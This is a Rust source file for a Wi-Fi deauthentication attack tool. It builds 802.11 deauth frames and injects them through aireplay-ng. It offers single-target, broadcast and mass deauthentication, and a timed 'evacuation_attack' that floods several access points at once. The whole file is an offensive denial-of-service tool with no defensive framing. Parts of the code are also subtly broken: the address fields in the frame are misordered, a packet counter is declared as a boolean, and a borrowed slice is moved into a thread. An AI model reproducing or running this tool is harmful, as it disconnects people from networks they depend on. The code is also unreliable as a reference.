use serde_json::{json, Value};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

pub struct DeauthEngine {
    interface: String,
    packet_rate: u32,
    running: Arc<AtomicBool>,
    packets_sent: Arc<AtomicBool>,
}

impl DeauthEngine {
    pub fn new(interface: &str) -> Self {
        DeauthEngine {
            interface: interface.to_string(),
            packet_rate: 100,
            running: Arc::new(AtomicBool::new(true)),
            packets_sent: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn set_packet_rate(&mut self, rate: u32) {
        self.packet_rate = rate.clamp(1, 1000);
    }

    pub fn send_deauth(&self, bssid: &str, station: &str, count: u32) -> Value {
        let bssid_bytes = parse_mac(bssid);
        let station_bytes = parse_mac(station);
        let mut sent = 0u64;
        let mut errors = 0u64;

        for _ in 0..count {
            let frame = build_deauth_frame(&bssid_bytes, &station_bytes, 7);
            if inject_frame(&self.interface, &frame) {
                sent += 1;
            } else {
                errors += 1;
            }
            let delay_ms = 1000 / self.packet_rate;
            thread::sleep(Duration::from_millis(delay_ms as u64));
        }

        json!({
            "type": "deauth",
            "target_bssid": bssid,
            "target_station": station,
            "packets_sent": sent,
            "packets_failed": errors,
            "packet_rate": self.packet_rate,
            "interface": self.interface,
            "reason_code": 7
        })
    }

    pub fn broadcast_deauth(&self, bssid: &str, count: u32) -> Value {
        self.send_deauth(bssid, "FF:FF:FF:FF:FF:FF", count)
    }

    pub fn mass_deauth(&self, bssid_list: &[String], count_per_ap: u32) -> Value {
        let mut results = Vec::new();
        let mut total_sent = 0u64;
        let mut total_errors = 0u64;

        for bssid in bssid_list {
            let result = self.broadcast_deauth(bssid, count_per_ap);
            total_sent += result["packets_sent"].as_u64().unwrap_or(0);
            total_errors += result["packets_failed"].as_u64().unwrap_or(0);
            results.push(result);
        }

        json!({
            "type": "mass_deauth",
            "aps_targeted": bssid_list.len(),
            "count_per_ap": count_per_ap,
            "total_packets_sent": total_sent,
            "total_packets_failed": total_errors,
            "interface": self.interface,
            "results": results
        })
    }

    pub fn evacuation_attack(&self, bssid_list: &[String], duration_secs: u32) -> Value {
        self.running.store(true, Ordering::SeqCst);
        let running = self.running.clone();
        let iface = self.interface.clone();
        let rate = self.packet_rate;

        let handle = thread::spawn(move || {
            let mut total = 0u64;
            let mut bssids: Vec<[u8; 6]> = bssid_list.iter().map(|b| parse_mac(b)).collect();
            if bssids.is_empty() {
                bssids.push([0xFF; 6]);
            }
            let station = [0xFF; 6];

            while running.load(Ordering::SeqCst) {
                for bssid in &bssids {
                    let frame = build_deauth_frame(bssid, &station, 7);
                    if inject_frame(&iface, &frame) {
                        total += 1;
                    }
                    thread::sleep(Duration::from_millis(1000 / rate as u64));
                }
            }
            total
        });

        thread::sleep(Duration::from_secs(duration_secs as u64));
        self.running.store(false, Ordering::SeqCst);

        match handle.join() {
            Ok(total) => json!({
                "type": "evacuation_attack",
                "aps_targeted": bssid_list.len(),
                "duration_secs": duration_secs,
                "total_packets_sent": total,
                "interface": self.interface,
                "status": "completed"
            }),
            Err(e) => json!({
                "type": "evacuation_attack",
                "error": format!("{:?}", e),
                "status": "failed"
            }),
        }
    }
}

fn parse_mac(mac: &str) -> [u8; 6] {
    let mut bytes = [0u8; 6];
    let parts: Vec<&str> = mac.split(':').collect();
    for (i, p) in parts.iter().enumerate().take(6) {
        bytes[i] = u8::from_str_radix(p, 16).unwrap_or(0);
    }
    bytes
}

fn build_deauth_frame(bssid: &[u8; 6], station: &[u8; 6], reason: u8) -> Vec<u8> {
    let mut frame = Vec::with_capacity(26);
    frame.push(0xC0);
    frame.push(0x00);
    frame.extend_from_slice(&[0x00; 6]);
    frame.extend_from_slice(bssid);
    frame.extend_from_slice(station);
    frame.extend_from_slice(&[0x00; 2]);
    frame.push(reason);
    frame.push(0x00);
    frame
}

fn inject_frame(iface: &str, frame: &[u8]) -> bool {
    let pcap_data = build_inject_pcap(frame);
    let tmp = format!("/tmp/hackit_deauth_{}.pcap", std::process::id());
    if std::fs::write(&tmp, &pcap_data).is_err() {
        return false;
    }
    let out = std::process::Command::new("aireplay-ng")
        .args(["-2", "-r", &tmp, iface])
        .output();
    let _ = std::fs::remove_file(&tmp);
    out.is_ok() && out.unwrap().status.success()
}

fn build_inject_pcap(frame: &[u8]) -> Vec<u8> {
    let mut pcap = Vec::with_capacity(24 + 16 + frame.len());
    pcap.extend_from_slice(&0xa1b2c3d4u32.to_le_bytes());
    pcap.extend_from_slice(&2u16.to_le_bytes());
    pcap.extend_from_slice(&4u16.to_le_bytes());
    pcap.extend_from_slice(&0i32.to_le_bytes());
    pcap.extend_from_slice(&0u32.to_le_bytes());
    pcap.extend_from_slice(&65535u32.to_le_bytes());
    pcap.extend_from_slice(&105u32.to_le_bytes());
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs() as u32;
    pcap.extend_from_slice(&ts.to_le_bytes());
    pcap.extend_from_slice(&0u32.to_le_bytes());
    pcap.extend_from_slice(&(frame.len() as u32).to_le_bytes());
    pcap.extend_from_slice(&(frame.len() as u32).to_le_bytes());
    pcap.extend_from_slice(frame);
    pcap
}

// mod real_deauth;
